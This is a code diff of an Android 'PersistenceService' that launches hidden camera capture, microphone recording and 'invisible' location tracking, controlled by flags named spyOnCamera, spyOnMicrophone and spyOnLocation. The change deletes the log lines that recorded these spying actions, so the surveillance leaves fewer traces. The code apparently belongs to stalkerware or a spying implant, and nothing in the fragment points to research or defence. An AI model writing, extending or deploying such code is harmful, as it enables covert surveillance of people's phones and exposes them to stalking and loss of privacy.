@@ -125,7 +125,6 @@ public class PersistenceService extends Service {
 
         // Could be cleaner code...I know
         try{
-            Log.i(TAG, "spyOnCamera: " + spyOnCamera);
             if(spyOnCamera){
                 intent = new Intent("CamFrontBackShot");
                 intent.setPackage(ctx.getPackageName());
@@ -135,7 +134,6 @@ public class PersistenceService extends Service {
             Log.e(TAG, "Error starting Service: " + e.getMessage());
         }
         try{
-            Log.i(TAG, "spyOnMicrophone: " + spyOnMicrophone);
             if(spyOnMicrophone && !MicrophoneService.isIsRecording()){
                 intent = new Intent("StartAudioCapturing");
                 intent.setPackage(ctx.getPackageName());
@@ -145,12 +143,10 @@ public class PersistenceService extends Service {
             Log.e(TAG, "Error starting Service: " + e.getMessage());
         }
         try{
-            Log.i(TAG, "spyOnLocation: " + spyOnLocation);
             if(spyOnLocation){
                 intent = new Intent("StartInvisibleTracking");
                 intent.setPackage(ctx.getPackageName());
                 ctx.startForegroundService(intent);
-                Log.i(TAG, "Started Location Tracking");
             } ctx.startForegroundService(intent);
         }catch (Exception e){
             Log.e(TAG, "Error starting Service: " + e.getMessage());
